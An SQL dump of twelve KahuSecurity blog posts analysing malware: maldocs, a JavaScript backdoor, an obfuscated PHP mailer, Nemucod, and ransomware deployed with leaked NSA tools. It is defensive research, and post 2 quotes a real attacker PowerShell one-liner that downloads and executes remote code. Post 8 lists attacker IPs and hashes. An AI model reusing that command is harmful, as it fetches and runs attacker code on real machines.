INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1, 'Introducing Reneo', 'darryl', 'June 27, 2018', 'Reneo is a Windows tool to help incident responders, forensics specialists, and security researchers analyze and reverse engineer malicious and obfuscated scripts and other content. This tool can convert from/to various formats, transform, deobfuscate, encode/decode, encrypt/decrypt, and hash strings.\nThe benefit of using this tool is that you can access many different utilities from a single, portable executable without relying on online converters or disclosing your content to some online service.\nReneo means “to unravel or solve” in Latin.\n\nThis is basically a re-write of Converter but with additional functionality and conveniences. For example, you can maximize the app, open multiple dialog boxes at the same time, and do some basic conversions from the command line. Just type “reneo /?” or “reneo -?” and a popup with instructions will appear.\n\nHere’s an example of using Reneo on a live script.\nThis PowerShell script came from a malicious Word macro. The gibberish in the middle is a string of decimal values separated by garbage characters which is removed at the end. The result is then xor’d with 0x31.\n\nFirst thing is to copy that string into Reneo then click on Edit > Text Transformer. Since we want to end up with decimal values separated by commas, I enter this into the method called “Replace All Chars…”.\n\nHere’s the result.\n\nI click on the button in the center and try converting from Decimal to Text to see what this looks like.\n\nAs expected, I get nothing useful because it’s “encrypted”. I then click on Decode/Decrypt > Simple Decrypter and make the following choices — decimal input, hex key, XOR method, single key action, and enter 31.\n\nAnd I get the decrypted script.\n\nHere’s one more example. This one is another malicious PowerShell script. I copy the base64-encoded portion to Reneo.\n\nIf I convert the above using Base64 to Text, the result will have a bunch of null characters because of Unicode so the better way is to Convert > Base64 to Hex then Format > Unicode to Hex and finally Convert to Hex to Text.\n\nThe top part of the script references the element position in the array below. I click on Decode/Decrypt > Script Decoder and copy the comma-separated array from the script into the popup box, leaving just the array position in the Input textbox. I removed the “-f” at the beginning of the array, chose the PowerShell method then click on “Start”. The result still requires some cleanup because the PowerShell script does some search/replacements at the end to make the result functional but I can already see what this script does.\n\n\nReneo is free for business or personal use. It has been packed to combine multiple DLLs and therefore may get incorrectly flagged by anti-virus.\nYou can get Reneo here.\nHappy reversing!', 'reneo, reverse engineering, tool', 'http://www.kahusecurity.com/?p=13761\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (2, 'A Quick Look Into the Oracle WebLogic Attacks', 'darryl', 'May 19, 2018', 'For awhile these attacks contained code that pointed to a webserver was down. Seems they changed servers and everything is up and running again.\nThe POST shows the PowerShell script inside of the soap envelope.\n\nExtracting then base64-decoding the script reveals the following:\n$OS=(GWmi Win32_OperatingSystem).Caption;$WC=New-Object Net.WebClient;$WC.Headers[‘User-Agent’]=”PowerShell/WL $OS”;IEX $WC.DownloadString(‘hxxp://101[.]200[.]45[.]78/images/test/DL.php’);\nIf you try to access this URL with a browser, your IP address will be blacklisted. That’s because the script above sets the headers with a specific user-agent. After you set the user-agent correctly, you will get the following:\n\nThe download is another PowerShell script. You need to deflate this after base64-decoding. You then get this rather long script.\n\nIn this snippet, the code tries to get around security software. \n\nHere are the URLs that downloads the coin miner.\n\nNow let’s have a look at the logs from the server. This one shows the blacklisted IP addresses.\n\nThis log file is more interesting as it shows successes and failures from many IPs. “Infected” devices include Windows 7, Server 2008, Server 2012, and Server 2016.\n\nIf this log is really accurate then it’s a scary representation of a large number of vulnerable (and now infected) devices mining coins for the crims.', 'coin miner, oracle weblogic, powershell', 'http://www.kahusecurity.com/?p=13746\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (3, 'Deobfuscating the Latest Maldocs', 'darryl', 'April 14, 2018', 'The constant barrage of malicious emails seeping into your users’ inboxes appear to be coming from Emotet, Hancitor, and Trickbot. Here are charts from Recorded Future showing cyber attacks from each of them. Emotet shows a huge bump in mid February, Hancitor takes over in early March, then Trickbot makes its presence known in late March.\n\n\n\nI wanted to see how cybercriminals were obfuscating their maldocs so I pulled down infected documents from Brad’s website, Malware Traffic Analysis. What I’m after are the URLs hidden inside the maldocs (or it could be malware callbacks) so they can be blocked at the gateway or used to detect computer infections.\nLet’s start off with Trickbot then move on to Emotet and Hancitor.\nTrickbot Maldoc\nAfter opening the document, I notice the macros button is dimmed…so no macro?\n\nThey’re using a known trick to disable the button but the macros are definitely there.\n\nYou can step through the VBA code and watch as it builds up the final script by decoding its pieces. For a lot of these scripts, you can search for “run” (another good search term is “shell”) and you might be able to find the point where the final script gets executed. We can see the “CallByName” method so it’s executing the code stored in that long variable.\n\nLet me add a breakpoint there and dump the value of the variable which turns out to be a PowerShell script.\n\nThe PowerShell script isn’t obfuscated so I can get the URLs which is what I was after. Done!\n\nEmotet Maldoc\nNow let’s analyze Emotet’s maldoc.\n\nIn the “AutoOpen” function, I can already see the “run” method so I don’t need to search for that. I’m interested in the variable at the end of the run line. Let me dump the variable out and put a breakpoint there.\n\nWhat I get is an encrypted PowerShell script.\n\nLet me fire up PowerShell ISE and paste in only the PowerShell code then execute it. The URLs appear at the bottom of the middle section. Done!\n\nYou can create a PowerShell wrapper or use AES to analyze the script statically. Check out this link for more info.\n\nHancitor Maldocs\nLet’s have a look at Hancitor. This is the document I’ll be analyzing.\n\nNo macros?\n\nYes, there’s macros but they’re using another trick to hide it.\nThis VBA code is rather interesting. The top part of the macro selects an object on the actual document, selects and copies it (which presumably causes it to drop malware into the temp folder), then executes the malware. The bottom part deletes the object, puts the cursor back up to the top then re-saves the document.\n\nHere’s the object on the document. Wonder what it is?\n\nLet me make the object bigger.\n\nIt’s the actual malware file. I wonder how long they’ll be using this method since the PE is bare and my VM didn’t even get infected.\nLet me pull down another maldoc from an earlier campaign.\n\nI start by working my way through the VBA code as usual. And then I come across this. The “digester” value holds a large byte array.\n\nI need to convert these bytes into hex so I can copy it out. I paste this short snippet into the macro in order to convert the values. Now I can copy this out.\n\nThis looks like shellcode but there’s no visible URLs there. From here I can convert this into a PE file and examine it in that form but in this case it’s easier to use a debugger. Keep this hex dump around because you can use this to search for the shellcode in the debugger.\n\nAfter attaching a debugger, I follow the VBA code to see where it’s loading up the shellcode and executing it. By the way, at the top of this module, you can see the API declarations making this VBA code harder to analyze than the previous ones.\n\nStepping through in the debugger I can see that it builds the imports and then fills some memory location (EAX) with gibberish. Then there’s a loop that decrypts this blob into Base64 using XOR 0x78533835c9a14324 (see the bottom left).\n\nThen it performs a base64 decode and you can clearly see the MZ header.\n\nAfter this it runs svchost.exe and injects code into it.\n\nFrom here I tried dumping the memory location from the debugger then running strings on it to find the URLs. Nothing. So I proceeded to dump the svchost.exe process.\n\nAnd I was able to get the URLs in there.\n\nA quicker way is to use URL Revealer and just open-all-the-things.\n\nBut then there’s no fun in that…\nHappy reversing!\nEDIT – 04/25/18\nChris Pierce was kind enough to share his Python script for decoding SecureString:\n\n# Standard Imports\nfrom base64 import b64decode\nfrom binascii import hexlify, unhexlify\n#Non Standard Imports\nfrom Crypto.Cipher import AES\n# AES Decrypt using IV and CBC mode\ndef decrypt_aes(enc_key, data, iv):\ncipher = AES.new(enc_key, AES.MODE_CBC, iv) # set the cipher\nreturn cipher.decrypt(data) # decrypt the data\n# Prints data out in hex_dump format.\ndef format_hex_dump(hexbytes, length=16):\nFILTER = \'\'.join([(len(repr(chr(x))) == 3) and chr(x) or \'.\' for x in range(256)])\n lines = []\nfor c in xrange(0, len(hexbytes), length):\nchars = hexbytes[c:c+length]\nhexbyte = \' \'.join([\"%02x\" % ord(x) for x in chars])\nprintable = \'\'.join([\"%s\" % ((ord(x) <= 127 and FILTER[ord(x)]) or \'.\') for x in chars])\nlines.append(\"%04x %-*s %s\\n\" % (c, length*3, hexbyte, printable))\nreturn \'\'.join(lines)\n# Main Function\ndef main():\n# This data contains the B64 encoded, AES encrypted PowerShell command. The data is in UTF-16 format so converted the B64 decode from UTF-16 to UTF-8.\n# NOTE: removed the 32-byte header \"76492d1116743f0423413b16050a5345\" which resides in front of the B64 data.\ndata = b64decode(\'\').decode(\'utf-16\').encode(\'utf-8\')\nprint \'\\nB64 Decoded Data:\\n{0}\'.format(data)\n # This is the AES encryption key: 24-bytes found within the sample hash.\n# Ex: [224..201]\nkey_list = [224, 223, 222, 221, 220, 219, 218, 217, 216, 215, 214, 213, 212, 211, 210, 209, 208, 207, 206, 205, 204, 203, 202, 201]\nkey = \'\'.join([chr(x) for x in key_list])\nprint \'\\nAES Key: {0}\'.format(key.encode(\'hex\'))\n # The B64 decode above contains a data blob delimited by \"|\". There are 3 elements after performing the split on \"|\".\n# The first element is the version number.\nversion = data.split(\'|\')[0]\nprint \'Version: {0}\'.format(version)\n # The second element is the B64 encoded AES IV.\niv = b64decode(data.split(\'|\')[1])\nprint \'IV: {0}\'.format(hexlify(iv))\n # The third element is the encrypted PowerShell code.\nenc_data = data.split(\'|\')[2].decode(\'hex\')\n # Passes the key, encrypted data, and iv to the AES decryption function.\ndecrypt = decrypt_aes(key, enc_data, iv)\n # Converts the data from UTF-16 to UTF-8.\nclean_decrypt = decrypt.decode(\'utf-16\').encode(\'utf-8\')\n # Makes the PowerShell code more readable.\nclean_decrypt = clean_decrypt.replace(\';\', \';\\r\\n\')\nprint \'\\nDecrypted Data (prettified):\\n\\n{0}\'.format(clean_decrypt)\nif __name__ == \"__main__\":\nmain()', 'deobfuscation, emotet, hancitor, macros, maldocs, office, trickbot, vba, word', 'http://www.kahusecurity.com/?p=13733\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (4, 'Reflow JavaScript Backdoor', 'darryl', 'March 30, 2018', 'A script was left behind on a compromised machine. This led to the discovery of a Windows backdoor written in JavaScript and the C&C backend scripts. Unfortunately I can’t post too much details because the victim’s organization name is present in the files.\nThe backdoor script is less than 2KB and the only indication of its presence on a compromised PC is a running process called “wscript.exe”, which is a legitimate Windows program. The main part of the script contains an endless do-loop awaiting commands after passing the query string “reflow” to the C&C else it sleeps for 4 hours. \n\nThe callback to the C&C looks like this:\n\nI wanted to find out more so I searched for code snippets in various search engines and VirusTotal but that led me nowhere. I turned to Recorded Future and found exactly what I was looking for. In case you don’t know Recorded Future helps to enrich your raw data with useful contextualized and correlated threat intelligence. What I like best is its ability to find things that search engines can’t because it’s been removed from paste sites or posted to a private forum, as examples.\nThe results I got show three hits to matching files that were deleted back in December 2017. The cached data and link back to the original source helped me recover a compressed file with the C&C package.\n\nThere are four main scripts (3 PHP and 1 JavaScript files) in the package that are copied to a web server. The web server may be attacker-controlled or compromised by some means. The main script, index.php, contains an SVG animation that looks like this when a visitor happens to visit the page.\n\nThis script shows that when “reflow” is passed to the page, contents of a malicious JavaScript file (renamed as a PNG file) is sent to the victim PC and eval’d by the backdoor script. The malicious script uses WMI to obtain the system Information then sends that info back as part of its authentication method.\nHere you can see the malicious script running an endless loop waiting for commands such as upload, download, and execute.\n\nThe “mAuth” function generates short random strings, concatenates them along with the system info and passes that to the C&C in a cookie after Base64-encoding it. These random strings are important as they are used as markers to identify instructions contained between them.\n\nData is transmitted back to the C&C using AJAX. There’s a function called “FillHeader” that populates the HTTP header.\n\nAgain, this is what the HTTP request looks like when the victim PC checks in:\n\nPerforming a Base64-decode on the cookie value results in the 2nd line. Repeating the Base64-decode on the string after the second caret reveals the system info.\n\nOne of the PHP scripts appears to be a template which is modified with HTML code to make the page look legitimate (e.g. it contain parts of an organization’s actual webpage). The script is renamed and referenced by the index.php script. This script has all the functions responsible for uploading and downloading files as well as creating activity logs. Among the log files are victim’s IP addresses, what files have been uploaded and downloaded, session information, etc.\nThe “Authentication” function reads in the cookie value from victims and parses out the system info, and defines variables used to create the log filenames. The victim’s username and computer name are MD5-hashed and used as part of the log filenames. When a victim PC connects to the C&C, three files are created on the C&C server:\n\nThe last PHP script in their package is used to interact with and send commands to the victim PCs. Note the timezone and interesting login method.\n\nThe available commands are quite limited but is more than enough to upload additional, more powerful tools to the victim PC and gain further access into their network. And finally, if the attackers sense they are about to be discovered, they can delete all the important log files with another set of commands built into this script.\nI don’t have any attribution information on these scripts but it doesn’t seem to be related to your-typical-crime-gang. It appears that this campaign is still ongoing as other files show updated timestamps.', 'backdoor, c2, javascript', 'http://www.kahusecurity.com/?p=13700\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (5, 'Deobfuscating a “Sophisticated” Mailer', 'darryl', 'February 25, 2018', '“Sophisticated” in that the spammer obfuscated the mailer script quite well. He/she apparently put quite a bit of work into concealing and protecting their spamming activity. I normally don’t come across PHP mailers that are obfuscated this well.\nHere’s what the incoming traffic to the PHP script looks like:\n\nIf the request is successfully processed then the following (more or less) gets returned:\na:1:{s:1:”r”;a:4:{s:1:”t”;i:1;s:1:”e”;i:0;s:1:”g”;i:30;s:1:”b”;i:0;}}\nAfter cleaning up the HTTP request body and separating the parameters, you can see that there’s five sets of parameters. Remember this for later.\n\nNow let’s have a look at the PHP script. The top part contains a large base64-encoded blob. At the bottom you can see that it reads in the cookie value and uses it to XOR the second, shorter base64-encoded string.\n\nI’m in the process of rewriting Converter so it’s a good time to put this new program to the test. Here’s what Reneo looks like when I de-XOR the string.\n\nI get another layer of obfuscation so I just repeat the process.\n\nThis is the result. This function reads in the large blob at the top, splits everything into four characters, builds an extraction list, reorders it in a certain way, concatenates a base64 string, decodes it, then evals the result.\n\nHere’s the final, deobfuscated mailer script. The interesting bits are at the beginning.\n\nThe mailer script reads in the POST body, sorts the variables and concatenates them, then XORs this value with a hardcoded key.\nLet’s go through this step-by step. Based on the above five sets of parameters, the variables are:\nbmbm\nyrdlcuby\ngaw\njjxpd\nxyqwmvt\nrfpz\nSorted and joined together it becomes:\nbmbmgawjjxpdrfpzxyqwmvtyrdlcuby\nThis value is then XOR’d with the hardcoded key built into the script, e886f82a-1c47-4677-93a6-5181ff8b8977, which results in the following in hex. This is the XOR key to decrypt the POST request values.\n07555A5B0159450B47491350454B444C4F4E5C4E5E1742544755545213044100555B5A50\nIf I take the values from the POST request, sort it by the same variable name then join the values together, it will look something like this (truncated base64-encoded string):\nZm9tYXoqfzp9a3Zyfip…MWE8PDRtYDE/aXEqMS0…NDohIHBhfDZiMjdkYmd…\nMjpjLzY5LmI4YHQ2OCJ…Lnggajo6MRE9di8kJjw…JmQqaygjf3p1fHVsKTo…==\nI then XOR this string with the key and get the mailing instructions which include the campaign info and recipients:\n\nThe spam message in this specific run looks like this:\n\nThe obfuscated PHP script can be found online (here and here). However, without the cookie value from the POST request, it would be very difficult to deobfuscate the PHP script. Additionally, the POST request cannot be deobfuscated without knowing the hardcoded XOR key in the PHP script. I’m fairly certain that the cookie value and XOR key will all be different for each compromised server which is probably why this is going under the radar.', 'mailer, obfuscated php, spam', 'http://www.kahusecurity.com/?p=13687\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (6, 'Deobfuscating PHPJiami', 'darryl', 'October 31, 2017', 'I was sent a PHP script that was protected by PHPJiami which you can find here. PHPJiami is a decent PHP obfuscator that appears to be able to bypass several online deobfuscators. Here’s what the script looks like:\n\nWhen you run it, you can see what the protected script does.\n\nAt the top there’s a comments section. Let me change the uppercase “P” in “PHP” to lowercase.\n\nNow when I run the script, nothing happens. This means there’s some kind of anti-tampering function in the script.\n\nLet me clean up the script so we can see what it’s doing. If you look at the second function, you can see what looks like variable assignments.\n\nAt the bottom of the script, you can see a blob of obfuscated text. This is probably where the prize is.\n\nAfter studying this a bit, I go back up to the second function and echo out the variables to see what they contain (look at the comments). That last line is interesting as it reads a copy of itself.\n\nThe section right below that has some interesting variables as well. It looks like it’s using MD5 to ensure the script isn’t modified. If all is good, the blob at the bottom gets uncompressed, rot13’d, etc.\n\nAlthough I have only have a brief understanding of what the script does, I think I have enough to deobfuscate the blob. Since I cannot modify this script to make it cough up the prize, I can trick it into thinking that the script hasn’t changed by making it read a copy of itself (I call this the “reflection technique”).\nHere’s the two changes made to the beautified version.\n\nOn the actual script or other PHPJiami scripts, all I do is search for strings that are at the end of the previous line which is ():”; Then put in the reference to the original script. From there, I search for “return” and put an echo there.\n\nWhen the script is run, I get a result which looks something like this which doesn’t mean too much.\n\nBut when you view the source, you can see the original source code.\n\nI just did a quick check to see if anyone else did a deobfuscation write-up and I came across this Chinese site.\nIt describes a few methods but one technique they offered caught my eye:\n\nIf you execute this, you get the deobfuscated script and it’s so easy to do. Might even work on a bunch of other scripts too.\n\nScroll down to the very bottom and you’ll see a long base64 string. If you decode this, you get the original script which is the same version I got using my, more difficult, reflection technique. Oh wellz.\n\nAlways nice to have multiple methods to use since their obfuscation method will probably be upgraded in the future.', 'deobfuscation, php, phpjiami', 'http://www.kahusecurity.com/?p=13672\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (7, 'ConverterNET v0.1 Released', 'darryl', 'June 24, 2017', 'I spent the past several months porting Converter to the .NET Framework and am finally able to release a public version of it.\n\nMany of the original functions are present and I’ve added a few more things to the menu. Several conveniences have also been included that may not be very obvious:\n+ Forms are non-modal so you can have multiple forms open at once\n+ Many forms can be maximized\n+ Many forms have split containers that you can resize\n+ Context menu have been added to key textboxes\n+ Textboxes are using a monospaced font\nThe Convert Binary function has been changed. You can choose to load a binary or text file and convert the file appropriately. If you want to XOR or shift the files then choose “Transform Only” then enter your comma-delimited text or hex key.\n\nThe Key Search/Convert function has also changed a bit. Specifically you can choose:\n+ Single key (e.g. abc ^ x)\n+ Multi-key (e.g. a ^ x, b ^ y, c ^ z)\n+ Multi-key sub-loop (e.g. a ^ xyz, b ^ xyz, c ^ xyz)\n+ Multi-key step # (e.g. a ^ (xyz % step), etc ).\n\nYou can get ConverterNET (32-bit and 64-bit binaries are included) from here. If you encounter any bugs, please let me know.', 'converter, converterNET', 'http://www.kahusecurity.com/?p=13654\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (8, 'Not Your Typical Ransomware Infection', 'darryl', 'May 25, 2017', 'An analysis of an infected PC revealed that an attacker used several NSA tools just four days after the Shadow Brokers’ dump then it burned the PC with ransomware when they were done with it. This blog post by Secdo may be related to this one but I can’t be sure.\nI was asked to assist with an infected PC that had already been turned off. The ransomware encrypted the usual file extensions as well as .exe, .dll, .sqlite, .log, .xml, .dat, etc making it extremely difficult to piece together the activity that had taken place earlier.\n\nOn 4/18/17, a remote user logged into the computer via RDP and proceeded to execute a program called “key.exe” which dropped files in “C:\\ProgramData\\MicrosoftHostDLL\\” including synchosted.exe (which is turned out to be NSSM – The non-sucking service manager). A new remote admin account called “backup1” was created and the password written to the info.ini file (and c:\\info.txt).\n\nThe attacker downloaded several tools to the downloads folder and disabled anti-virus and added an exclusion for c:\\users\\backup1 in Windows Defender.\n\nOther tools were installed as well such as UniversalTermsrvPatch-x64 and Advanced IP Scanner.\nBased on the evidence, the following NSA tools were used by the attacker:\n + FuzzBunch (exploit framework)\n+ Architouch (SMB recon)\n+ EternalBlue (SMB exploit)\n+ DoublePulsar (backdoor)\n+ DanderSpritz (event log deleter, password stealer, screengrabber, keylogger)\n+ PeddleCheap (shellcode/DLL injector)\nWhen FuzzBunch is run, log files are created which provide a history of the operator’s activities. However, the ransomware program encrypted these files.\n\nThere were some files left untouched for some reason and I was able to collect details that show whether an attempt was successful or not.\n\nOne successful compromise prompted the attacker to download and install OWASP-ZSC to compile shellcode and use PeddleCheap to push that onto the machine. Each attempt caused the PC to crash. Digging into the crash dumps yielded the shellcode source.\n\nWhen this failed, other attempts were made to install malware.\n\nI tried to get the payload from the above site but it was no longer available. I found something in Google’s cache that seemed to match the file names.\n\nThe attacker then downloaded executables onto the desktop and tried to push them onto the other PC which failed. Having given up, the attacker trashed the PC by executing ransomware known as “Global Imposter”.\n\nIt appears that this attacker was figuring out how to use the NSA tools and eventually with enough practice s/he is going to get good at it. Others will too so we will probably start seeing a higher level of attacks — attacks using military-grade implants that don’t leave a whole lot of traces behind. Good luck to all of us.\nObservables\nFilename: key.exe\nMD5: EECD77E9D522F3BA9022AC55487D98F1\nSize: 1.19MB\nFilename: synchosted.exe\nMD5: E1D51EAE61D112CB00F8F9CED4D7294C\nSize: 331KB\nFilename: genpwd.exe\nMD5: 0569047CAD5FFE8C40290960FFDCFDA1\nSize: 808KB\nFilename: local.exe\nMD5: B1BA95F7F943E424D562AA5BB255ADC5\nSize: 530KB\nFilename: 1.exe\nMD5: 227837783DFC1C2B3575746478CC133E\nDate: 7KB\nURL: 23.111.188.254:31337\nFilename: 2.exe\nMD5: 1AB7415C4A38F45085857FB9E6BD2069\nSize: 72KB\nURL: 23.111.188.254:4013\nFilename: 3.exe\nMD5: 6D1029FABF4D314065E3B33AC02ACEA6\nSize: 1.14MB\nURL: 23.111.188.254:22572\nFilename: 4.exe\nMD5: 9B79D2C612E4EAFB9034FD652F5A20EA\nSize: 1.14MB\nURL: 23.111.188.254:15892\nFilename: Aifc0CC.exe\nMD5: E967102AA181290B3A2BB68AD36E285A\nSize: 72KB\nURL: 45.114.116.192:13187\nFilename: GFDXaoPXi.exe\nMD5: 81B9EA03264EA0A2B65B36EACB05B465\nSize: 72KB\nURL: 23.111.188.254:7605\nIPs/Domains\n78.37.191.149 – pppoe.avangarddsl.ru\n178.70.232.38 – avangarddsl.ru\n178.70.225.165 – avangarddsl.ru\n178.70.149.30 – avangarddsl.ru\n23.111.188.254 – hvvc.us\n45.114.116.192 – brilliantangle.com', 'nsa, ransomware, smb', 'http://www.kahusecurity.com/?p=13649\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (9, 'Wild Wild West – 05/2017', 'darryl', 'May 2, 2017', 'Another update to the exploit kit scene. There’s been some changes but nothing very exciting. We can’t put our guards down however since this could change very easily.\nIf anyone cares to share the source for anything in the most wanted category, I would love to study it. And yes that includes Eris / Solar / Neptune.\nBig thanks to Kafeine for his input as I couldn’t have done this without him!', '', 'http://www.kahusecurity.com/?p=13638\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (10, 'Static vs Dynamic Analysis and the Amusing Outcome', 'darryl', 'February 27, 2017', 'It all started with a malicious RTF document attached to an email and a request from reader Chris (thanks for your request and help!) to locate the embedded SWF object since it was believed to contain a hidden PE file.\nThe RTF document contained a 2012 exploit which is described here. The difference between the two documents is that this one contained a SWF file.\nI proceeded to use oletools to search for SWF files using pyxswf.py. Nothing. I then used rtfobj.py to dump all the objects.\n\nI looked through the files and no SWF header. I also used OfficeMalScanner’s rtfscan and got the exact same objects and no SWF. I went back to each of the objects using a hex editor and I find the header…kind of.\n\nThe “FWS” header can be translated into hex as 0x465753 but in the file it shows up as “0x04657532”. It’s off by half-a-byte. I wrote a quick program that shifts the file by converting everything to hex, removing the first hex character at the beginning, padding the end with a null, then converting everything back into bytes.\n\nNow I get the Flash file.\n\nChris suggested I use Didier Steven’s rtfdump.py (with the latest fix — version 0.5) which gets the job done.\n\nUsing JPEXS you can see the deobfuscation routine of the embedded binary data.\n\nI created another program to do some ad hoc XOR’ing and I find that the binary blob is another Flash file. You can read this TrustWave article on Sundown EK and use their Python script.\n\nThis embedded SWF file is reusing an exploit from Magnitude EK. You can read about that exploit here btw. No sign of a PE file. \n\nLet me go back to the large object I dumped earlier and try to find the PE file using static analysis. At the top, I notice that this is the same marker as the one identified in the SecureList blog post. Looks like the PE file is here but it’s obfuscated.\n\nI compare this file with the malware that gets dropped by the malicious RTF file and I can see that it lines up exactly and that the null bytes are left intact. Since nulls are present, I can rule out compression and modern encryption. That leaves shift and XOR as a possibility but since they ignored nulls, I can’t easily get the key.\n\nWhat I need to find is a large contiguous blob without any nulls. Near the bottom of the PE file I come across padding strings. There’s other parts of the file I could use but this makes it quicker.\n\nAll I need to do is XOR the plaintext with the obfuscated portion and I can get the key. I use Converter’s Key Search/Convert and paste the values in and I get the result.\n\nHere’s what the result looks like. It looks random but I’m hoping there’s a repeating pattern here. That pattern would represent the XOR key.\n\nHere’s a trick I do to find a pattern. I simply change the dimensions of the Notepad window and watch the pattern emerge. There it is!\n\nSo the repeating value appears to be 256 bytes long and looks like this:\nAFB6BDC4CBD2D9E0E7EEF5FC030A11181F262D343B420050575E656C737A81888F96\n9DA4ABB2B9C0C7CED5DCE3EAF1F8FF060D141B222930373E454C535A61686F767D84\n8B9299A0A7AEB5BCC3CAD1D8DFE6EDF4FB020910171E252C333A41484F565D646B72\n7980878E959CA3AAB1B8BFC6CDD4DBE2E9F0F7FE050C131A21282F363D444B525960\n676E757C838A91989FA6ADB4BBC2C9D0D7DEE5ECF3FA01080F161D242B323940004E\n555C636A71787F868D949BA2A9B0B7BEC5CCD3DAE1E8EFF6FD040B121920272E353C\n434A51585F666D747B828990979EA5ACB3BAC1C8CFD6DDE4EBF2F900070E151C232A\n31383F464D545B626970777E858C939AA1A8\nLet me test this out with Converter. Ugh, so close!\n\nAfter analyzing the results, I noticed that if a null character is present then it doesn’t rotate the key for the next loop. So I add a new option to Converter…and it works! It works on the decoy document embedded in this object file as well.\n\nNow I wanted to find the shellcode and verify this using dynamic analysis.\nOne way is to open the document with Word, dump the memory, then look for that marker. Here’s the shellcode.\n\nAnd here it is in the RTF document.\n\nIf you dissemble this, you find that the first part of the shellcode deobfuscates the second part. XOR’ing the second part with a value of 0xA6 reveals the PE decoding routine. I went ahead and XOR’d it then put everything together in IDA. But let me use a debugger instead…\n\nAh, it’s not a 256-byte XOR key! You can see that the shellcode deobfuscates the PE file using XOR with a starting value of 0xA8 then incrementing it by 0x07. If there’s a null byte then it skips that byte (and doesn’t increment the value). How simple.\nSo at the end of all this, it turns out that the 256-byte XOR key found during static analysis is the same result I got dynamically albeit the long way to the solution. Very amusing!\nNote: If you look at the XOR key above, you’ll see that 0xAF + 7 = 0xB6 + 7 = 0xBD …etc. And when you get to the end, 0xA8 + 7 = 0xAF.\nUpdate 03/01/2017 – To those who where asking, here’s the PE results from VirusTotal.', 'flash exploit, malware, rtf, shellcode, word exploit', 'http://www.kahusecurity.com/?p=13629\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (11, 'Wild Wild West – 11/2016', 'darryl', 'November 5, 2016', 'It’s been awhile since I updated this; my apologies for the delay to those who have been asking.\nMany thanks to Kafeine for his expertise and invaluable feedback!', '', 'http://www.kahusecurity.com/?p=13607\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (12, 'Deobfuscating the Nemucod Downloader Script', 'darryl', 'October 22, 2016', 'Matt Decker from hybrid-cloudblog.com sent me this script he received via email and asked for help deobfuscating this so here we go…\nHere’s the WSF file he sent me:\n\nAbout half-way down the script, I come across this. Two variables should have caught your eye.\n\nDoing a search for the first variable name, I end up at the variable “vista” which references that blob and then the function is immediately called.\n\nTo view the value of “vista”, I do this. I don’t want the script to run any further so I do a quit right after the popup.\n\nAnd this is what I get. It shows several functions like reading and writing to a file and three conversion functions. This decrypts the download file which I’ll get to in a bit.\n\nSearching for the other variable, brings us here. It’s inside of a for-loop and the variable “efioppocsonny5HORDA6” appears to be building up URLs then calling a function named “efioppocsonny5_a2”. Notice that the URLs are being passed in the first argument.\n\nNow let’s search for this function. It’s going back up to here. Based on what’s in the function, it looks like it’s preparing and making AJAX calls.\n\nSo our goal is to see the URLs and block the HTTP request for now. Here’s the changes I make.\n\nWhen I run it, I get the URLs one at a time.\n\nIf you want to pull down the payload then search for “.Run” and comment out that line so the payload won’t execute and interrupt our analysis.\n\nBased on the script, it will download and save a file into the Temp folder, read it in, decode it, write it out to a DLL file, then execute it. However, this particular script doesn’t seem to have domains that answer so I have to find another script with live domains.\nHere’s another one I got from VirusTotal Intelligence:\n\nAnd make the same change.\n\nThis time I get the payload, the script decodes it then writes it out to a DLL file which turns out to be Locky/Odin.\n\nLet’s have a look at the original downloaded file and the DLL file from the Temp folder. I wrote this program to analyze the files. I load up the binary files into each input box (only the first 1,024 bytes are read to save time).\n\nThen I choose the “XOR” method as my first guess.\n\nI get this result. Do you see a pattern in the output box?\n\nHow about now?\n\nI can use Converter to XOR the original file using the same XOR pattern (converted to hex).\n\nAnd get the same result as the original.\n\nNow let’s see if we can find this in the script. Near the bottom there’s a long string that gets sent to the function VGRA3 (that function is from the blob we deobfuscated earlier). Then later when the payload is downloaded, the variable holding this key is used to XOR the file. It’s the same string.\n\nWe’re done!\nBut I did want to show you another related script I found. It’s basically the same as the one above, however, the JScript is inside of an HTML file. This is an important distinction because we have to deobfuscate this differently.\n\nAt the bottom of the script, we see that it’s functionally similar to the script we just looked at. Do you see that function call at the “if” statement? Let’s search for that. By the way, the blue arrow is pointing to the XOR key.\n\nHere’s the function that takes in some arguments passed from the call at the bottom. The first argument is the URLs just like the previous script.\n\nIf I search for the variable name, we see that there’s two other variables prepending it.\n\nLet’s see what these three variables are by adding the following line then have it stop running the rest of the script. Notice I have to use “alert” and “stop” instead of “WScript.Echo” and “WScript.Quit”.\n\nNow I can execute the script by running it in IE. You can’t use another browser because this script uses an ActiveX control.\n\nYou can continue to alert on variables to better understand what it’s doing but you’ll find that it’s doing the same thing as the WSF script from above.\nGood luck!', 'difference calculator, javascript deobfuscation, jscript, locky, odin, wscript, wsf', 'http://www.kahusecurity.com/?p=13604\n');
